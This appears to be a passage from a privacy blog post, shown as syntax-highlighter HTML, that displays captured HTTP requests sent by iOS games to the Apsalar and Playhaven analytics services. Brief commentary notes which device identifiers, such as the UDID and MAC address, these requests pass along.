			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /api/v1/start?a=bbr_live&amp;av=2012.06.19&amp;c=wifi&amp;i=net.skyvu.battlebearsroyal&amp;lag=0.00&amp;n=battlebearsroyal&amp;p=iOS&amp;rt=plist&amp;s=2D8CBCCB-6B21-4E46-99AE-D263633C6DDB&amp;sdk=Apsalar%2F4.0.2&amp;u=7355BD42-0268-4871-8491-A32536281933&amp;v=5.1.1&amp;k=APID&amp;dk=%5B%7B%22k%22%3A%22MAC1%22%2C%22v%22%3A%228e4a57d622ba39867acd46bb7bbbbe7e37707c08%22%7D%2C%7B%22k%22%3A%22OPNU%22%2C%22v%22%3A%2263d47693b3b0914eb52e8eecfeb90e4c346533af%22%7D%2C%7B%22k%22%3A%22MAC5%22%2C%22v%22%3A%226cdd87a9cd1ff1a3f9a1752b8a0f7231%22%7D%2C%7B%22k%22%3A%22ODIN%22%2C%22v%22%3A%222feefff43ab5f162efaef5f1107caa114008b36b%22%7D%5D&amp;cr=0&amp;h=d76685a3187d9822033ab1d28e35f5375d591b1c HTTP/1.1
Host: e.apsalar.com
User-Agent: battlebearsroyal/2012.06.19 CFNetwork/548.1.4 Darwin/11.0.0
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Pragma: no-cache
Connection: keep-alive
Proxy-Connection: keep-alive</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa9a66827928201-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a66827928201-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa9a66827928201-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a66827928201-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa9a66827928201-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a66827928201-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa9a66827928201-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a66827928201-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa9a66827928201-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">api</span><span class="crayon-o">/</span><span class="crayon-i">v1</span><span class="crayon-o">/</span><span class="crayon-i">start</span><span class="crayon-sy">?</span><span class="crayon-v">a</span><span class="crayon-o">=</span><span class="crayon-i">bbr_live</span><span class="crayon-o">&amp;</span><span class="crayon-v">av</span><span class="crayon-o">=</span><span class="crayon-cn">2012.06.19</span><span class="crayon-o">&amp;</span><span class="crayon-v">c</span><span class="crayon-o">=</span><span class="crayon-i">wifi</span><span class="crayon-o">&amp;</span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-v">net</span><span class="crayon-sy">.</span><span class="crayon-v">skyvu</span><span class="crayon-sy">.</span><span class="crayon-i">battlebearsroyal</span><span class="crayon-o">&amp;</span><span class="crayon-v">lag</span><span class="crayon-o">=</span><span class="crayon-cn">0.00</span><span class="crayon-o">&amp;</span><span class="crayon-v">n</span><span class="crayon-o">=</span><span class="crayon-i">battlebearsroyal</span><span class="crayon-o">&amp;</span><span class="crayon-v">p</span><span class="crayon-o">=</span><span class="crayon-i">iOS</span><span class="crayon-o">&amp;</span><span class="crayon-v">rt</span><span class="crayon-o">=</span><span class="crayon-i">plist</span><span class="crayon-o">&amp;</span><span class="crayon-v">s</span><span class="crayon-o">=</span><span class="crayon-cn">2D8CBCCB</span><span class="crayon-o">-</span><span class="crayon-cn">6B21</span><span class="crayon-o">-</span><span class="crayon-cn">4E46</span><span class="crayon-o">-</span><span class="crayon-cn">99AE</span><span class="crayon-o">-</span><span class="crayon-i">D263633C6DDB</span><span class="crayon-o">&amp;</span><span class="crayon-v">sdk</span><span class="crayon-o">=</span><span class="crayon-i">Apsalar</span><span class="crayon-o">%</span><span class="crayon-cn">2F4.0.2</span><span class="crayon-o">&amp;</span><span class="crayon-v">u</span><span class="crayon-o">=</span><span class="crayon-cn">7355BD42</span><span class="crayon-o">-</span><span class="crayon-cn">0268</span><span class="crayon-o">-</span><span class="crayon-cn">4871</span><span class="crayon-o">-</span><span class="crayon-cn">8491</span><span class="crayon-o">-</span><span class="crayon-i">A32536281933</span><span class="crayon-o">&amp;</span><span class="crayon-v">v</span><span class="crayon-o">=</span><span class="crayon-cn">5.1.1</span><span class="crayon-o">&amp;</span><span class="crayon-v">k</span><span class="crayon-o">=</span><span class="crayon-i">APID</span><span class="crayon-o">&amp;</span><span class="crayon-v">dk</span><span class="crayon-o">=</span><span class="crayon-o">%</span><span class="crayon-cn">5B</span><span class="crayon-o">%</span><span class="crayon-cn">7B</span><span class="crayon-o">%</span><span class="crayon-cn">22k</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">3A</span><span class="crayon-o">%</span><span class="crayon-cn">22MAC1</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">2C</span><span class="crayon-o">%</span><span class="crayon-cn">22v</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">3A</span><span class="crayon-o">%</span><span class="crayon-cn">228e4a57d622ba39867acd46bb7bbbbe7e37707c08</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">7D</span><span class="crayon-o">%</span><span class="crayon-cn">2C</span><span class="crayon-o">%</span><span class="crayon-cn">7B</span><span class="crayon-o">%</span><span class="crayon-cn">22k</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">3A</span><span class="crayon-o">%</span><span class="crayon-cn">22OPNU</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">2C</span><span class="crayon-o">%</span><span class="crayon-cn">22v</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">3A</span><span class="crayon-o">%</span><span class="crayon-cn">2263d47693b3b0914eb52e8eecfeb90e4c346533af</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">7D</span><span class="crayon-o">%</span><span class="crayon-cn">2C</span><span class="crayon-o">%</span><span class="crayon-cn">7B</span><span class="crayon-o">%</span><span class="crayon-cn">22k</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">3A</span><span class="crayon-o">%</span><span class="crayon-cn">22MAC5</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">2C</span><span class="crayon-o">%</span><span class="crayon-cn">22v</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">3A</span><span class="crayon-o">%</span><span class="crayon-cn">226cdd87a9cd1ff1a3f9a1752b8a0f7231</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">7D</span><span class="crayon-o">%</span><span class="crayon-cn">2C</span><span class="crayon-o">%</span><span class="crayon-cn">7B</span><span class="crayon-o">%</span><span class="crayon-cn">22k</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">3A</span><span class="crayon-o">%</span><span class="crayon-cn">22ODIN</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">2C</span><span class="crayon-o">%</span><span class="crayon-cn">22v</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">3A</span><span class="crayon-o">%</span><span class="crayon-cn">222feefff43ab5f162efaef5f1107caa114008b36b</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">7D</span><span class="crayon-o">%</span><span class="crayon-cn">5D</span><span class="crayon-o">&amp;</span><span class="crayon-v">cr</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-o">&amp;</span><span class="crayon-v">h</span><span class="crayon-o">=</span><span class="crayon-e">d76685a3187d9822033ab1d28e35f5375d591b1c </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a66827928201-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">e</span><span class="crayon-sy">.</span><span class="crayon-v">apsalar</span><span class="crayon-sy">.</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-53c98e7aa9a66827928201-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">battlebearsroyal</span><span class="crayon-o">/</span><span class="crayon-cn">2012.06.19</span><span class="crayon-h"> </span><span class="crayon-i">CFNetwork</span><span class="crayon-o">/</span><span class="crayon-cn">548.1.4</span><span class="crayon-h"> </span><span class="crayon-i">Darwin</span><span class="crayon-o">/</span><span class="crayon-cn">11.0.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a66827928201-4"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Language</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">en</span><span class="crayon-o">-</span><span class="crayon-e">us</span></div><div class="crayon-line" id="crayon-53c98e7aa9a66827928201-5"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">gzip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">deflate</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a66827928201-6"><span class="crayon-i">Pragma</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">no</span><span class="crayon-o">-</span><span class="crayon-e">cache</span></div><div class="crayon-line" id="crayon-53c98e7aa9a66827928201-7"><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a66827928201-8"><span class="crayon-i">Proxy</span><span class="crayon-o">-</span><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-i">alive</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0100 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa9a70454289210" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /api/v1/event?a=contact_pixowl_com&amp;av=1.04&amp;p=iOS&amp;k=APID&amp;u=88F9DF40-7C7A-4B89-9DF1-BBD32E97C7EF&amp;i=com.bulkypix.thesandbox&amp;lag=0.04&amp;rt=plist&amp;s=D3F4A0AA-BAF1-4541-9BBC-6F5AA393EED6&amp;sdk=Apsalar/4.0.5&amp;t=4.75&amp;n=Opened%20game&amp;e=%7B%22Version%22%3A104%7D&amp;h=ec7baaf46c9fe859013d46d3465619c1e13739de HTTP/1.1
Host: e.apsalar.com
User-Agent: sandbox/1.04 CFNetwork/548.1.4 Darwin/11.0.0
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Pragma: no-cache
Connection: keep-alive
Proxy-Connection: keep-alive</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa9a70454289210-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a70454289210-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa9a70454289210-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a70454289210-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa9a70454289210-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a70454289210-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa9a70454289210-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a70454289210-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa9a70454289210-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">api</span><span class="crayon-o">/</span><span class="crayon-i">v1</span><span class="crayon-o">/</span><span class="crayon-i">event</span><span class="crayon-sy">?</span><span class="crayon-v">a</span><span class="crayon-o">=</span><span class="crayon-i">contact_pixowl_com</span><span class="crayon-o">&amp;</span><span class="crayon-v">av</span><span class="crayon-o">=</span><span class="crayon-cn">1.04</span><span class="crayon-o">&amp;</span><span class="crayon-v">p</span><span class="crayon-o">=</span><span class="crayon-i">iOS</span><span class="crayon-o">&amp;</span><span class="crayon-v">k</span><span class="crayon-o">=</span><span class="crayon-i">APID</span><span class="crayon-o">&amp;</span><span class="crayon-v">u</span><span class="crayon-o">=</span><span class="crayon-cn">88F9DF40</span><span class="crayon-o">-</span><span class="crayon-cn">7C7A</span><span class="crayon-o">-</span><span class="crayon-cn">4B89</span><span class="crayon-o">-</span><span class="crayon-cn">9DF1</span><span class="crayon-o">-</span><span class="crayon-i">BBD32E97C7EF</span><span class="crayon-o">&amp;</span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">bulkypix</span><span class="crayon-sy">.</span><span class="crayon-i">thesandbox</span><span class="crayon-o">&amp;</span><span class="crayon-v">lag</span><span class="crayon-o">=</span><span class="crayon-cn">0.04</span><span class="crayon-o">&amp;</span><span class="crayon-v">rt</span><span class="crayon-o">=</span><span class="crayon-i">plist</span><span class="crayon-o">&amp;</span><span class="crayon-v">s</span><span class="crayon-o">=</span><span class="crayon-i">D3F4A0AA</span><span class="crayon-o">-</span><span class="crayon-i">BAF1</span><span class="crayon-o">-</span><span class="crayon-cn">4541</span><span class="crayon-o">-</span><span class="crayon-cn">9BBC</span><span class="crayon-o">-</span><span class="crayon-cn">6F5AA393EED6</span><span class="crayon-o">&amp;</span><span class="crayon-v">sdk</span><span class="crayon-o">=</span><span class="crayon-i">Apsalar</span><span class="crayon-o">/</span><span class="crayon-cn">4.0.5</span><span class="crayon-o">&amp;</span><span class="crayon-v">t</span><span class="crayon-o">=</span><span class="crayon-cn">4.75</span><span class="crayon-o">&amp;</span><span class="crayon-v">n</span><span class="crayon-o">=</span><span class="crayon-i">Opened</span><span class="crayon-o">%</span><span class="crayon-cn">20game</span><span class="crayon-o">&amp;</span><span class="crayon-v">e</span><span class="crayon-o">=</span><span class="crayon-o">%</span><span class="crayon-cn">7B</span><span class="crayon-o">%</span><span class="crayon-cn">22Version</span><span class="crayon-o">%</span><span class="crayon-cn">22</span><span class="crayon-o">%</span><span class="crayon-cn">3A104</span><span class="crayon-o">%</span><span class="crayon-cn">7D</span><span class="crayon-o">&amp;</span><span class="crayon-v">h</span><span class="crayon-o">=</span><span class="crayon-e">ec7baaf46c9fe859013d46d3465619c1e13739de </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a70454289210-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">e</span><span class="crayon-sy">.</span><span class="crayon-v">apsalar</span><span class="crayon-sy">.</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-53c98e7aa9a70454289210-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">sandbox</span><span class="crayon-o">/</span><span class="crayon-cn">1.04</span><span class="crayon-h"> </span><span class="crayon-i">CFNetwork</span><span class="crayon-o">/</span><span class="crayon-cn">548.1.4</span><span class="crayon-h"> </span><span class="crayon-i">Darwin</span><span class="crayon-o">/</span><span class="crayon-cn">11.0.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a70454289210-4"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Language</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">en</span><span class="crayon-o">-</span><span class="crayon-e">us</span></div><div class="crayon-line" id="crayon-53c98e7aa9a70454289210-5"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">gzip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">deflate</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a70454289210-6"><span class="crayon-i">Pragma</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">no</span><span class="crayon-o">-</span><span class="crayon-e">cache</span></div><div class="crayon-line" id="crayon-53c98e7aa9a70454289210-7"><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a70454289210-8"><span class="crayon-i">Proxy</span><span class="crayon-o">-</span><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-i">alive</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0065 seconds] -->
<p>There appears to be a lot of encoded data sent across by this particular system. So we can&#8217;t see that much from this, but we can tell a few times:</p>
<ul>
<li>Application identifier</li>
<li>Locale date</li>
<li>Radio type (WiFi in this case)</li>
<li>Platform</li>
<li>And then a lot of seemingly hashed data I can&#8217;t make very much out of.</li>
</ul>
<p><strong>api2.playhaven.com</strong><br />
Playhaven is a marketing platform for mobile games. It communicates over HTTP, and passes over the device UDID and a mac address.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa9a7a825968087" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /v3/publisher/open/?d_mac=d8306270d8f7&amp;sdk-ios=1.10.4&amp;hardware=iPad1,1&amp;device=de5381e09b10d93043b50f43153f3aeeb4dcc589&amp;nonce=DZDK1Sf1fNl7_qS-1SuBn8Oan1I&amp;session=&amp;languages=en,fr,de,ja,nl&amp;idiom=1&amp;os=iPhone+OS+5.1.1&amp;gid=vVUzpgmPxbzd2nFUTfTppE1f3-E&amp;app=com.glu.wasteland&amp;connection=2&amp;token=a081c07329894f7f90703108fc4b658c&amp;d_odid=63d47693b3b0914eb52e8eecfeb90e4c346533af&amp;signature=5UFIFoiLlV9-T5Taa5Ik-12lIBE&amp;app_version=534 HTTP/1.1
Host: api2.playhaven.com
User-Agent: wasteland/534 CFNetwork/548.1.4 Darwin/11.0.0
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Pragma: no-cache
Connection: keep-alive
Proxy-Connection: keep-alive</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa9a7a825968087-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a7a825968087-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa9a7a825968087-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a7a825968087-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa9a7a825968087-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a7a825968087-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa9a7a825968087-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a7a825968087-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa9a7a825968087-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">v3</span><span class="crayon-o">/</span><span class="crayon-i">publisher</span><span class="crayon-o">/</span><span class="crayon-i">open</span><span class="crayon-o">/</span><span class="crayon-sy">?</span><span class="crayon-v">d_mac</span><span class="crayon-o">=</span><span class="crayon-i">d8306270d8f7</span><span class="crayon-o">&amp;</span><span class="crayon-i">sdk</span><span class="crayon-o">-</span><span class="crayon-v">ios</span><span class="crayon-o">=</span><span class="crayon-cn">1.10.4</span><span class="crayon-o">&amp;</span><span class="crayon-v">hardware</span><span class="crayon-o">=</span><span class="crayon-i">iPad1</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">device</span><span class="crayon-o">=</span><span class="crayon-i">de5381e09b10d93043b50f43153f3aeeb4dcc589</span><span class="crayon-o">&amp;</span><span class="crayon-v">nonce</span><span class="crayon-o">=</span><span class="crayon-i">DZDK1Sf1fNl7_qS</span><span class="crayon-o">-</span><span class="crayon-cn">1SuBn8Oan1I</span><span class="crayon-o">&amp;</span><span class="crayon-v">session</span><span class="crayon-o">=&amp;</span><span class="crayon-v">languages</span><span class="crayon-o">=</span><span class="crayon-i">en</span><span class="crayon-sy">,</span><span class="crayon-i">fr</span><span class="crayon-sy">,</span><span class="crayon-i">de</span><span class="crayon-sy">,</span><span class="crayon-i">ja</span><span class="crayon-sy">,</span><span class="crayon-i">nl</span><span class="crayon-o">&amp;</span><span class="crayon-v">idiom</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">os</span><span class="crayon-o">=</span><span class="crayon-i">iPhone</span><span class="crayon-o">+</span><span class="crayon-i">OS</span><span class="crayon-o">+</span><span class="crayon-cn">5.1.1</span><span class="crayon-o">&amp;</span><span class="crayon-v">gid</span><span class="crayon-o">=</span><span class="crayon-i">vVUzpgmPxbzd2nFUTfTppE1f3</span><span class="crayon-o">-</span><span class="crayon-i">E</span><span class="crayon-o">&amp;</span><span class="crayon-v">app</span><span class="crayon-o">=</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">glu</span><span class="crayon-sy">.</span><span class="crayon-i">wasteland</span><span class="crayon-o">&amp;</span><span class="crayon-v">connection</span><span class="crayon-o">=</span><span class="crayon-cn">2</span><span class="crayon-o">&amp;</span><span class="crayon-v">token</span><span class="crayon-o">=</span><span class="crayon-i">a081c07329894f7f90703108fc4b658c</span><span class="crayon-o">&amp;</span><span class="crayon-v">d_odid</span><span class="crayon-o">=</span><span class="crayon-cn">63d47693b3b0914eb52e8eecfeb90e4c346533af</span><span class="crayon-o">&amp;</span><span class="crayon-v">signature</span><span class="crayon-o">=</span><span class="crayon-cn">5UFIFoiLlV9</span><span class="crayon-o">-</span><span class="crayon-i">T5Taa5Ik</span><span class="crayon-o">-</span><span class="crayon-cn">12lIBE</span><span class="crayon-o">&amp;</span><span class="crayon-v">app_version</span><span class="crayon-o">=</span><span class="crayon-cn">534</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a7a825968087-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">api2</span><span class="crayon-sy">.</span><span class="crayon-v">playhaven</span><span class="crayon-sy">.</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-53c98e7aa9a7a825968087-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">wasteland</span><span class="crayon-o">/</span><span class="crayon-cn">534</span><span class="crayon-h"> </span><span class="crayon-i">CFNetwork</span><span class="crayon-o">/</span><span class="crayon-cn">548.1.4</span><span class="crayon-h"> </span><span class="crayon-i">Darwin</span><span class="crayon-o">/</span><span class="crayon-cn">11.0.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a7a825968087-4"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Language</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">en</span><span class="crayon-o">-</span><span class="crayon-e">us</span></div><div class="crayon-line" id="crayon-53c98e7aa9a7a825968087-5"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">gzip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">deflate</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a7a825968087-6"><span class="crayon-i">Pragma</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">no</span><span class="crayon-o">-</span><span class="crayon-e">cache</span></div><div class="crayon-line" id="crayon-53c98e7aa9a7a825968087-7"><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a7a825968087-8"><span class="crayon-i">Proxy</span><span class="crayon-o">-</span><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-i">alive</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0064 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v2.5.0 -->

